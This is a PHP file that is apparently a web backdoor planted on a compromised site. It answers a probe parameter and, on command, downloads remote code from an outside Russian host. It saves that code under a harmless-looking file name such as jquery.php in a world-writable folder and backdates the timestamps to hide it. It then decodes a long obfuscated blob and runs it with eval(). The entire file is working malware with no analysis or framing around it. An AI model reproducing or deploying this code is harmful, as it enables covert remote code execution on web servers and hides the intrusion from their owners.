<?php
error_reporting(0);
set_time_limit(0);
if (isset($_GET['q']) AND $_GET['q']=='1'){echo '200';}

if (isset($_GET['q']) AND $_GET['q']=='2')
{

	$url='http://ms-mx.ru/ku.txt';

	set_time_limit(0);

	function get_script($url)
	{
	
		$kk = array('list', 'styles', 'images', 'help','index','jquery','plugin','mod','mobile','test');
		$rand_keys = array_rand($kk, 2);

		$rnd = $kk[$rand_keys[0]].'.php';//��������� ��� �����
		#$rnd = 'faim.php';
		$time=filemtime(getcwd());//���������� ����� ���������� ���������

		mkdir("temp");
		chmod("temp", 0777);
		
		
		@touch('temp/'.$rnd);
		chmod('temp/'.$rnd, 0777);
		
		if (is_writable('temp/'.$rnd) == true)
		{
			file_put_contents('temp/'.$rnd,file_get_contents($url));
			#echo file_get_contents($url);
			chmod ('temp/'.$rnd, 0644);
			@touch('temp',$time);//����� �����
			@touch('temp/'.$rnd,$time);//����� ����
			
			$cut = rtrim( dirname( $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'] ), "/" )."/";
			
			$cut =  $cut."temp/".$rnd;
			$cut = str_replace('http://','',$cut);
			$cut = 'http://'.$cut;
			if(strlen(file_get_contents('temp/'.$rnd)) > 5){return $cut;}
			else{return FALSE;}
			
		}else
		{
			return false;
		}

	}


	$full_url = get_script($url);
	
	if($full_url !='' AND $full_url != FALSE)echo $full_url;
		
	
}

for($o=0,$e='&\'()*+,-.:]^_`{|,,,|-((.(*,|)`)&(_(*,+)`(-(,+_(-(.(:(](^(_(`({)]+`+{+|,&-^-_(^)](](^(_(^(:(`(,-_(.-_(](:(,+_(-+_(--_(`(.(.+`+_(-(:(.(,+_(--^(.-_(:+{(]+{(:(:(^(`(,(,(,(.(:(:(:+{(,(_(:(_+_(-)](](,(:-_(,,&(_,&+_(-(`(:(.(,(.(.+_(-(.+`(,-_(.(`(](.(_-^(,)](:({(,(,(_(](.(](.-^(,(,(`(,(](:(.({(]-^+_(-(^+_(-(^(.(](,+`(`,&(:+{(.-^(_-_(`-_(]-^+_(-+{(:-^+_(--^(,(_(:(](,(_(`)](:,&(.(,+_(-+{+_(-+|(:(^(,(^(.+{+_(-({(,(^(^(,(_+_(-(_)](.(.(.(](,+_(-(,,&(^(`(`(^(]-^(,(.(,(.(:-_+_(-(^(_)](.(.(.(](,+_(-(,,&(:(^(,(^(.+{+_(-({(,(^(^(,(_+_(-(_)](:(^(.-^(,(_(_(](]+|(`(`(.(.+_(--^(,(.(:+{+_(-+`(`+_(-(:(`(:-_(,,&(,-_(.+{(,+_(-(:)](`+_(-(.+{(_+_(-(_+`+_(-)]+_(-(_(,(.(:(`(`)]+_(-,&(:+`+_(--^(.(.(`(_(,-^(:(`(](]+_(-,&+_(-)](^({(:-_+_(--_(:,&(,)](:-^(:-_(,(](.+{+_(-(_(,+`(:(](:(_(:(,(,-_(`+{(]-^(.(`(`-_+_(-(,(,(^(^-^+_(-(`(,+`(:(_(:+|+_(-({(`+{(],&(,(.(,(.(:-_+_(-(^+_(-)](](:(](^(_(:(`)](^-_(_(:(^+`(_+`(`+_(-(](^(_+_(-(^+{(^+{(^(,+_(-(.(:,&(,(:(:(_(](.(_(:(_,&+_(-(_(]-_+_(-)](^,&(,({(:+`(:+|(,)](:({(]+`(.(:(:(,(]+{(:(.(^(:(^(.(,({(:(:(:(`(]+`(:(_+_(-(.(.-_(:(^(_+_(-(.+_(-(^(:+_(-(](,(.(:+|(:+|(](.(`(](,(.(.+{(.(^(:(](:(^(^(`(,+_(-+_(-({(.(_(:+_(-+_(-({(.(_(],&(_(_+_(-(_(,,&(:(,(^({+_(-+_(-+_(--_(:+{(:(_(,(](,+|(,-_(:(.(:-_+_(-({(:+_(-(](^(^+`(]+|(.(.(:({+_(-)](.(,+_(--^(.(.(.(]+_(--^(_(.+_(--_(^+{(^(,(^({(:,&(,-_(:(^(,(:(.(](:(:(](:(_(.(^-^+_(-(:+_(-({(,,&(.+`+_(-(:(.(,+_(--^(.-_(:+{(]+|(_)](`(_+_(-(]+_(--^(:+|(:+`+_(--^(:+`(,(^(.(](,)](,-^(:,&(^-_(,+_(-+_(--_(.+_(-(`+_(-(],&(.(,+_(-(:(:)](.(.(,-^(.({+_(-+_(-(^+{(](.(_)](^(:(,-^(:(_(,+|(.(:(:({(,-^(_,&+_(-+_(-+_(-+`(,+`(.+_(-(,(_+_(-)](:+{(,-_(.(_(:+`(:(](.(,(]-^+_(-(`(,({(`(^(`(^(.+`(:(^+_(--_(.(](:(^+_(--_(.+|(^)]+_(-+|(:(](:(`(.+_(-(,(:(.(,+_(--^(:)](`-^(]+|(:(_(^-^+_(-(`(,(`(:-^(,(_(,-_(.+{(,-_(.)](`+_(-(](.(_+|(,,&(`({(,-_(:(`(:-_(,(:(:,&(,-_(_(.(`+_(-(,(:(.(](](^(.,&+_(-+{(:,&(.)](,-_(:,&(],&(_(_+_(-(_(,,&(:(,(^({+_(-+_(-+_(--_(:+{(:(_(,(](,+|(,-_(:(.(:-_+_(-({(:+_(-(](^(^+`(]+|(.(.(:(_+_(-+`(:(_(,(](_,&(`-_(](.(`-^(:+|+_(-(_(,-^(:(](:(,(,(](:(_(](.(_,&(:-^(,+`(:(_(_)](,(.+_(-)](:,&(:+`(:(^(:+|+_(-+`(.-_(:({(]+|(_)](`(_+_(-(]+_(--^(:+|(:+`+_(--^(:+`(,(^(.(](,)](,-^(:,&(^-_(,+_(-+_(--_(.+_(-(`+_(-(],&(.(:+_(-({(.(^(:(^(:(](.+`(](_+_(-(`(,(^(`(^(`(,(](:(_({(_(,(.-^(:(:(,,&(.+|(^({+_(-(`(](:(`(^(:+_(-(,+{(.(,(:(^(.-_(.-^(,-^(.(_+_(-+_(-(^-^(.+{(:(](.+|(,(](:(,+_(--^(.(:(:)](,(^+_(-+`(^(:(,+`(,(.(.+_(-(.,&+_(-)](`+{(],&(.-_(.-^(,-^(.(_+_(-+_(-(^+{(](.(_)](^(:(,-^(:(_(,+|(.(:(:({(,-^(_,&+_(-+_(-+_(-+_(-(,+`(:+|(,(_(,-_(.+{(,-_(.)](`+_(-(](`(_,&(^-^+_(-(:+_(-({(,,&(.)](,+{(.(,+_(-)](:-^(:-^+_(-)](:(,(]+`(,-^(,(:(:(:(.+`(:(^(.(,+_(-(:(:)](.(.(,-^(.({(]+`(,-^(,(:(:(:(.+`(:(^(.(,(,(.(.-_(:+`(,(`+_(-+`(^(:(,+`(,-^(:+_(-(.(^+_(-(_(:+{(,+{(:)](,)]+_(-+{(.+`(](_+_(-(`(,(^(.-^(.(^(,(.(:(.+_(-)]+_(-(^(.(_+_(-)](.+`(^(^(.,&(,(](.(.(:+|(,(](.-_+_(-(_(.(.(:(`+_(-({+_(-+`(^(:(,+`(,-^(:+_(-(`(,(](:(_({(_(,(.(:(:(,(](:(_(](^(^+_(-(:(,(^(,,&(:+|+_(-(.(:(_(,)](_(:(.,&+_(-(:+_(-+`(^(.+_(-+{(,-^(`+`(`-^(,)](:(.(,(](_+`(:({(,(](:+_(-+_(-(_+_(-(`+_(-(:(:(`(:+`(^(,(`(:(,(](.(^(`(_(,,&(:(,(^({+_(-+_(-+_(--_(:+{(:(_(,(](.(,(]+`(.+{(.(,(,+`(.+|(^+`+_(-(:(,)](:-^(:+|(],&(`+`(^+_(-(:(`(^+|(](](_+`(^(^+_(-+`(,-^(:+_(-(:(.(]+`(:+`(,+|(_+`(.+_(-(,-^(_(^(^(^+_(-(:(,(^(`(.(:+`(,(^(:,&(,+|(.(:(:+_(-(_+_(-(.+_(-(^(:+_(-(](,(.(:+|(:+|(](.(`(](,(.(.+{(.(^(:(](.+|(^({+_(-+{(:(](:(^(:+|+_(--^(`(](](_(,+`(:(,+_(--^(.+{(^(^(,(_(,(.(:,&(:(`(:(^(:(_+_(-(.(.(:(.(^+_(--_(:(_+_(--^(^(^(,(.(:+|(:(,(:(^(:(](,-_(:-^(`+_(-(](.(_+|(,,&(`({(,-_(:(`(:-_(,(:(:,&(,-_(_(.(`+_(-(,(:(.(](](^(.,&(,(.(:+|(:(,(:(^(:(](,-_(:-^(,)](,+`(.)](^+`(^(^(](`+_(-(.(:-_+_(--_(:,&(,)](:-^(:-_(,(](.+{(_)]+_(-(`+_(-(:(:+{(.+`+_(--^(.(,(](.(_,&(:-_(,(^(.+|(_)]+_(-(^(,-^(.(_(,(_(,+{(:-_(,(_(_,&(`-_(](.(`-^(:+|+_(-(_(,-^(:(](:(,(,(](:(_(](.(_,&(:(^(,+`(.+{(_)]+_(-+_(-(,(](:+|(:-_(,(:(:(](],&(_(_(`-^(,(:(.(](](^(.,&(,(.(:+|(:(,(:(^(:(](,-_(:-^(.+`+_(-(`(.,&(^(`(,+_(-(:(](:+{(:(`(,(:(,+|(,,&(.-_(.(.(:(](.(](^+`+_(--^(](.(`+{(_(.(_(,(:+`(,+|(_(.(`(`(,({(.(](^({(.,&(,({(:,&(:(`(,+|(:+`(,,&(_(:(.,&+_(-(:+_(-+`(^(.+_(-+{(,-^(`+`(`-^(,)](:(.(,(](_+`(:({(,(](:+_(-+_(-(_+_(-+_(-(,(](:+|(:-_(,(:(:(](],&(_(:(_,&+_(-(_(]-_+_(-)](^,&(,+|(:(`(.,&(]+`(:(,(,(^(.(](:(,(,(.(.(.+_(-(_(,(](,+`(:-^(.+|(,-_(^)](,+|(:-_(:({(,({(:+_(-(^-_+_(-,&(,(^(`(.(.+_(-(:(^(:+`(,(](.(:(,)](,+|(.(,(](.(^+`(]-_(:+|(`(,+_(-+_(-(:+`(,+|(_(.(:-^(,+`(:(_(_)]+_(-+{(,(^(:+{(,(_(,,&(:(_+_(--^(_(:(.,&+_(-)](.(,(](.(,(`+_(-)](:+|(`+_(-(.+`(:+`(,(](.(:(,)](,+|(.(,(](.(^+`(]-_(:+|(`(,(](:(_({+_(-(`(.-_(:+`+_(-({(.(,(^-_+_(-(](](:(:+`(:({+_(-)](,+|(,(:(.(](:-_(:(](.(.(^(:(,(_(:(](:(:(:(^(,(_(`+`+_(-+_(-(_-^(:-^(^(_(,(^(^-_+_(-+|(,(.(,,&(:-^(,-_(.(`(:(^(.+{(:+`(,(`(_,&+_(--_(])]+_(-)](:(`(.,&+_(--_(.+_(-(,(](_(.(`(.(,(:+_(--^+_(-(.+_(-+|(:(_(,)](`-^(,(_(:+|(,)](.+{(:+`(:(](:(:(^(`+_(--^+_(--^(:(`(`-^(:(`(`+`(^+_(-(:(`(.+{(_+_(-(_+`+_(-)](^(.(,({(:+`(:+|(,)](:({(]+`(:)](:(`(,,&(.(,+_(-(_+_(--_(,(](:(_(:+|(_(,(:+`(,+|(_(.(.-^(:(](.+|(^({+_(-+{(:(](:(^(:+|+_(--^(`+{(],&(:)](:(`(,,&(.(,(_)]+_(--_(,(](:(_(:+|(],&(`+`(](:(:+_(-(.-^(:(](.+_(-(^-_+_(-(`(](:(`(^(:+`(,+{(:,&(]+`(.(](:)]+_(--_(_(^(^(:(,+`(,-^(:+_(-(_(:(]+`(.(,(,+{(.+|(:(:(]+{(.({(^)]+_(-(_(,-^(`(.(:({(,)](.(`(,(:(:+|(:(:(]+|(_+|(,,&(,-_(_+_(-(`,&(`(_+_(-)](:-^(,+{(:({(.(.(]+{(.(,(]-^+_(-(`(,({(`(.(:+_(-(,-_(:-_+_(-+`(.-_(.(]+_(-({(]-_(^(,(,(`(,(^(:+_(-(.,&(,(:(:+|(,(](_+`(.-^(:(](:(^(^(`(,+_(-+_(-({(.(_(:+_(-+_(-({(.(_(](.(_-^(:(^(](.(:-^(`(_(,(.(,+`(.+_(-(.+`+_(--^(:+{+_(-({(:-_(`-^(]-_(.(_+_(--_(])]+_(-(_(^({(:-_+_(--_(:,&(,)](:-^(:-_(,(](.+{+_(-(_(,+`(:(](.+_(-(.(,+_(-)](.(`(,-_(.(`(`-^(]-_(.(_+_(--_(,)](.+{(.+_(-(.(,+_(-)](.(`(,-_(.(`(`-^(]-_(.(_+_(--_(])]+_(-(_(^({(:-_+_(--_(:,&(,)](:-^(:-_(,(](.+{+_(-(_(,+`(:(](.+_(-(:+_(-(,-_(:-_(,(_+_(-(^(:(:+_(-(:(.(,(^(^(^+`(]-_(:+_(-(`(,+_(-+_(-(:(_(,)](.(.(:)](]+{(,(^(](^+_(-+`(,-^(:-^(:(^(:(^(:(_+_(-(.(.-_(:(^(](:(_+_(-(^(^(^+{(^(,(.-_(^(:(,+|(.(_(,(](.)](.(.(,(.(.+`(^({(^(.+_(-(:(,,&(.)](,(^(.(:(,-_(.(](`-^(]-_(.(_+_(--_(,)](]-_(:,&(_(.(,(:(:(^(](.(_(.(`(.(,,&(`({(`(_(,(.(,(](.(.(:+|(,(](`+{(]-^(.)](`+`(]+|(:(`+_(-+_(-(^+{(](.(`+{(.(.+_(-,&(:+{(,(:(.(_(:(:(](:(_(](`(_+_(-(](,-^(:,&(:-_(](.(`(`(,+|(_(:(`-_+_(-(,(_+_(-(^)](^+|(^(_+_(-(.(:-_(,,&(:(_+_(--^(:)](`-^(]-_(.(:+_(--_(])]+_(-(_+_(-(.(.)](,)](:-_(,(^(:)](:(:(](:(_+_(-(^(,(^+{(^(,(.-_(:+|(,)](:+{(,(^(_+`(`(.(,(](`-^(]+{(`({(,,&(.(`(:(`(,)](.(`(,(:(.(^(:({(]+{(:,&(_)](,(.+_(-)](:,&(:+`(:(^(:+|+_(-+`(.-_(:({(](:(_+_(-(^(^(^+{+_(-(,(`(_(:(_(^+_(-(:+`(,+|(_(.+_(-(_(,(.(:(_(_)](,(,(,-^(.+_(-(:(_+_(--_(.+_(-(,)](.-_(`-^(]-_(:(^(,+{(:(.+_(-+{(.(,(:(_(,)](,+|(,(^(:+`(:(:(,(^(_,&+_(-(.+_(-+_(-(](`(:(:(.+{+_(-({(:(.+_(-(:(_(.(_(_(^(_(`+{(^(`(,(,+_(-)](:(:(.(,(](.(`(]+_(-+`(.(:(.(_(,-^(_(.+_(-+`(^(^+_(-)](`(^(`(,(](_(_(.(^(`(`(](:(`+_(-)](:(`(^(`(,+{(](:(`(^(.)](,(:(.(:(,-_(_,&(`+`(]+|(:(.+_(-+_(-(^+{(](`(_(,(_(](^(](:(.+_(-({(:({(:(`+_(-(.(_,&+_(-+_(-(,(.(,(.(.(.(:+|(],&(`-_(],&(:,&(`+_(-(](.(_+|+_(-+`(^(_(,,&(`+{(`(,(](:(.({(.+`(.+|(:(^(,(`(.+`(](^+_(-(`(](:(`(_(:-_(:+_(-(_(:(:(`(_(:(_,&+_(-+|(.,&(^-_+_(--^(,-^(`+`(`({(.+`(:(^(,-_(.(^(:(,(](:(_+_(-(^(,(.)](^+`(,-_(`(,(](:(.({(]-^(.(^(`({(^(_(,(^(^(,+_(-(^(,-^(.(_(.+`(](.(`(`(,+|+_(-+_(-(_(`(:(_(_+|(,,&(,-_(.+{(:(](:+`(,(_(:+|+_(-)](.-_(`-^(]-_(.(:(_,&(](:(:(_(`+{(_(.(.+`(.(:+_(-({(.(^(:(^(:(](.(_(^+`+_(-,&+_(-({(:(`(`+_(-(]-^(.(:(](:(`+_(-(.+{(,-^(.(_(^-^+_(-,&(]+{(`(_(:(_(^+_(-(.-^(_(,(.+|(.(:(,(^(.(_(](.+_(-+{(,(](:+|(`)]+_(-(.(,+|(,-_(:(.(:(:(,({(_,&+_(-(.+_(-+_(-(](.(.)](`,&(,(^(_({(.+`(.-_(.-^(,-^(.(_+_(--^(^(_(,({(`-^(`,&(,(^(`+`(^+_(-(.-_(:(^(,(:(.+`+_(-(_(:(.(,(.(:-_(.)](,(_(:+|(,-^(.-_(`-^(])]+_(-)](^({(^(,(](`(`(_(:(_(](:(_({+_(-(`(](,(`)](](](.+_(-(^)](^(.+_(-({(:-_(:({+_(-({(.(`(]+`(.+|(:(:+_(--_(.(_(^-^(`({(,,&(.(`(:(`(,)](.(`(,(:(.(^(:({(]+{(:,&(_)](,+_(-+_(--^(.(.(:+|+_(-({(:(^(,-_(:-^(:(^(,(:(_,&+_(-(.+_(-(:(](`(`(_(.)](](_(`(`+_(-({(_(_(`(.(,(`(_+|(:+|(,)](_+_(-(^+{(:(,(,+|(`+{(]-^(:)](_+{(.+{(.(:(](^+_(-,&(,({(:)](:(_+_(-+`(:(_(,(](_(.(`(.(,+`(_)]+_(-(.(,(.(](.(`+{(^(:(_(:(.({(_(,(](:(^-_(,(.(.(:+_(--^(^(_(,,&(_-_+_(-)](,+|(:+|+_(-+`(.-_(:({(](:(_+_(-(^+`(^-^(])](.(^(:+{(]({(`+`(](:(](,(^-_(_(.(:-^(:+|(`+{(_(.(^+{+_(-)](,+|(.(]+_(-({(.(:(.(.(,-^(_,&+_(-(.(,+_(-(](`(`(,+_(--^(.-_(,(`(]+`(_({(`({(]-_(:(`+_(-({(^(,(]+{+_(-+`(,,&(:-^(,(:(](^(`+{(`({(^+{+_(-)](](](.-^(,(^(,-^(.+{(:(_(:,&(]({(_(:(_,&(_+_(-(]+|(:-_(`+{+_(-+|(:+`(:(,(,(_(:(_(](.(_+{+_(-(_(,,&(.(,(^)]+_(-(](](:(`(_(.+`(](:(`+`(_(,(](:(^-_(_(.(:-^(:+|(`+{(_(.(^+{(^(,(]-^(:+_(-(^(`(,+`(:(,+_(-)](.(,(^(`+_(-(_(](:(`(_(.+`(](_(_+{(^+{(`(:(_(](](.(`-^(:+|(`+{(_(.(^+{(^(,(.+`(:(^+_(-,&(:({(:-_+_(--_(.(,+_(--^(^(_(,,&(`-^(`,&(,({(`+`(^+_(-(](,(^-_(_(.(]+|(]+{(`({(_(.(^+{(^(,(.+`(:(^(,)](.(_(:)]+_(-({(.(,+_(--^(^(_(,,&(`+{(_(.(_(,(^+`(_(:(](:(:(:(,({(.,&(^)](^(.(])]+_(-,&+_(-(.(:(_(:,&(]({(`+_(-(^+|(_(.(]+|(]+{(`({(_(.(^+{+_(-)](,+|(:(,(,(_(.(^(.(^(,-^(_,&+_(-(.(,+_(-(](.(_)](^(:(_(:(.-^(_(,(:(`(^+|(](](_+`(^(.+_(-,&(]+{(.+_(-(:(](,+{(.+_(-+_(--^(_+`(:(:+_(-(:(.(,(^(^(`({(,,&(.(`(:(`(,)](.(`(,(:(.(^(:({(]+{(:,&(_)](,+_(-(,(_(:(:(.+{+_(--^(,+|(,-_(:(.(:(:(,({(_,&+_(-(.+_(-+_(-(](.(^({(.(.(_(,(^+`(,(:(.+|(`-^(]-_(.(_(,+{(]-_(^(_(`(,(.-^(,(.(:+`(,)](.(.(`(_+_(-({(:(,(](_+_(-(`+_(-)](:(](:+|+_(--^(:(,(,(.(_+`(_(`(^(^(_(^+_(-)]+_(-(_(,-^(.(](`(_(,(](.(_(,(_(.(_(`(_(^)](`+{+_(-(_(^,&(,-_(:(`(.-_(](^(:,&+_(--_(.(_(:+`(]+{(_(:+_(-(,(^(.(,-^(:+_(-(:+_(-(,(^(`(:(.(^(,+_(-(`(](](.(]-_(:-_(,)](_+_(-(^+{(^(,(,-_(:(,(,(.(.(^(`(_(])](,+`(`,&(.-^(,(^(`(,(_(.(_(,(^+`+_(-(`(](,(^-_(,-^(.)](](^+_(-(`(,(.(:(](`+_(-(.+`(.(,+_(--^(:({(.(^+_(--_(:(`+_(--^(^(_(,({(`-^(`+{+_(-)](.(_+_(-+`(.-_(.(](,,&(.(,(](.+_(-+_(-(,(:(`(,(`(,(](:(^)](_(:(:+_(-(^+|(_(.(]+|+_(-(.+_(-(:(^(_+_(-(.(:+|+_(-(.(.(:(,(_(.(^(:(.(,-^(_,&+_(-+_(-(^(.(]+|(`-^(`,&(,)](`+`(^+_(-(](,(^-_(_(.(:,&(_)](,+_(-+_(--^(.(.(:+|+_(-({(:(^(,-_(:-^(:(^(,(:(_,&+_(-(.+_(-(:(:(,(_(:(,(](](_(`(`(,+{+_(-+_(-(_(](:(_(_)]+_(-(.+_(-(:(:(,(_+_(-(,(](](_(`(`(,+{+_(-+_(-(_(.(:(_(_+|(,,&(`({(_(.(.-_(^(:(_(:(:(_(,(_(:)](:(:(,(.(.(:+_(--^+_(-+`(,+`(.+_(-(,(_+_(-+`(:(.+_(-)](:)](.(.(,(:(:(`(](:(^+{+_(-(,(.+`(,(_+_(-+`(:(.+_(-)](:)](.(.(,(:(:(`(](:(^+`(]-_(:+_(-(`(,(^+_(-(.-^(_(,(](:(:(:(,(`(:(_(^(:+_(-+{(,,&(`+`(:+_(-(,+{(.(,(:(^(:)](.-_+_(-({(:+_(-(^(:+_(--_(](.(.)](.+_(-(:(^(.(,+_(-(:(:)](.(.(,-^(.({+_(--^(^(_(,({(`+{(_(.+_(-(`(^)](_(:(.-_(:+`+_(-({(.(,(^-_+_(-(](](:(:+`(:({+_(-)](,+|+_(-)](.(.(:(:(,(`(.)](_)]+_(-(`+_(-(:(:(`(:+`(](:(.({+_(-(.+_(-(^(.(^(,(:(.(,(^+`+_(--^(:(](:(`(.+_(-(,-_(:(,(](.(_-^(:(^(](.(`-^(]+{(`({(_(.(:(`(:(^+_(-)](:(_(,(:(.+|(`-^(,(:(.(](](^(.,&+_(-+{(:,&(.)](,-_(:,&(](:(:+_(-(.-^(:(](:(^(^)](,(.(,-^(:+|(`+_(-(]-^(:(,(](:(`+_(-(.+{(_+_(-(]+|(^(:+_(--^+_(-({(:(`(:(,(,+|(`+{(,(.(.+{(.(^(:(](:(^(](]+_(-,&(,({(,,&(:(_+_(-+`(:(_(,(](_(:(.,&+_(-(:+_(-+`(](_(,(,(,(](:+_(-(,(_(,(^(.(:(,-_(.(](`-^(]-_(.(_+_(--_(])]+_(-(_(^({(^(,(,-_(:-_+_(-)](.-_(:-_(,,&(_,&(^-^+_(-(:+_(-({(,,&(:+|+_(-(.(:(_(,)](_(:(.,&+_(-(:+_(-+`(^(:(,+`(,-^(:+_(-(`+_(-(]-^(:(,(](:(`+_(-(.+{(_+_(-(:({(:+|(^,&(](](:(^(:(_(_(,(`(`(,(](`(`(`+_(-(:({(.-_(`+|(.(](,(,+_(-(`(_-_+_(-({(:({(:({+_(-(:(:+|(]+|(`-^(:+|(^(_(,({(_-_(`,&(:(^+_(-(,(.(^(,(^+_(-,&(.(.(,(,(_,&(^(_(,(^(,-_(_(.(_(,(:+`(,+|(_(.+_(-(_(,-^(.({(](_(,(_+_(-(.(`+`(`,&(,)](`+`(](:(:+_(-(`(.(,({(`({+_(-(.(.,&(:+{+_(-,&(,+`(:-^(,({(]-^(.(](,+{(^(,(:({(:+|+_(-+{(,,&(`+`+_(-)](,-_(:-^+_(-+`(:-^(.-_(](:(_+_(-(^(^(^+{(](.(.)](`,&(,)](_-^(]-^+_(-(^+_(-+_(-(.-^+_(-+_(-(_,&(^(_(,(^(,-_(_(.+_(-(`(^)](,(:(.+|(`-^(.+{(.(.(^(:(,(_(:(](:-_(:({(,,&(:+`(,)]+_(-(^(.(`+_(--^(.+`(](.+_(-(`+_(-({(,,&(:-^+_(-+`(:(,(](.(_(:(`-_+_(-(,(_+_(-(^(^(]-_+_(-({(.(_(.+{(,(:(.(:+_(-)](.(_(:(`+_(-({(.,&(^(:(,+_(-(](:(`(_(:+`(](:(_({+_(-(`(](,(.-^(:(](:(_(^+{+_(-(:+_(-)](.(_(,(_(,-_(.+{(,-_(.)](`-^(]-_(.(_+_(--_(])](_+_(-(-(_(*,*)`(-(-)^*&,|-(,*(.(*,++^(*,|+`(:)^(*,|(^(^(:-^,:,,(.(*,|)_)\'),(:-^(*,.+^(*,++^(*,|+`+`)`(*,|)^-`,+,_-),+-^(*,*({)`*&,),.-((.(.(*,.+^(*,++^(*,|+`+`)_)_)*(:(^(.(*,.+^(*,++^(^(^(*,|+`+`(:(:)^-`-`,:,,(.(\'*&,:-)-),+-*(.(*+|+)*++(+,*++((:(:-^(*+|*)*|*|*^*:*+)`(,(**.+*+*+&+|*)*|*|*^*:*++|+,*\'+(+))^(*+|+&*|+)+*)`(,(**.+*+*+&+|+&*|+)+*+|+,*\'+(+))^(*+|*-*++*)`(,(**.+*+*+&+|*-*++*+|+,*\'+(+))^-`(*,^)`(*+|*)*|*|*^*:*++^(-,^,+-:(-+`)^,:,,(.,+,`-&-*-:(.(*,^(:(:-^(*,^)`(*+|+&*|+)+*+^(-,^,+-:(-+`)^-`,:,,(.,+,`-&-*-:(.(*,^(:(:-^(*,^)`(*+|*-*++*+^(-,^,+-:(-+`)^-`,:,,(.(\'*&,,-+,{,)-*,:,|,{+|,+-.,:-)-*-)(.(-,*,+,)-(-:-&-*(-(:(:-^,+-,,\',_(.(-,,-+,{,)-*,:,|,{(&,*,+,)-(-:-&-*(.(*,+(_(*,^(:-^,:,,(.(\'(*,^(:-^-(,+-*-+-(,{)^-`(*,+,_)`*&-)-*-(,_,+,{(.(*,+(:)^(*,^,_)`*&-)-*-(,_,+,{(.(*,^(:)^(*-(,_)`(*,+,_(+(*,^,_)^(*,,,_)`(*,+,_(`(*-(,_)^,,,|-((.(*,|)`)&)^(*,|)_(*,,,_)^(*,|(^)`(*,^,_(:-^(*-&)`*&-)-+,(-)-*-((.(*,+(_(*,|(_(*,^,_(:)^(*,*({)`(((*,^((+{(((*-&(()^-`,:,,(.(*-(,_(:-^(*-&)`*&-)-+,(-)-*-((.(*,+(_(*,,,_(_(*-(,_(:)^(*,^)`*&-)-+,(-)-*-((.(*,^(_)&(_(*-(,_(:)^(*,*({)`(((*,^((+{(((*-&(()^-`-(,+-*-+-(,{(.(*,*(:)^-`(-(:)^-`(*,*)`*&,*,+,)-(-:-&-*(.(*,*(_(*,^(:)^,+-,,\',_(.(*,*(:)^',$d='';@ord($e[$o]);$o++){if($o<16){$h[$e[$o]]=$o;}else{$d.=@chr(($h[$e[$o]]<<4)+($h[$e[++$o]]));}}eval($d); ?>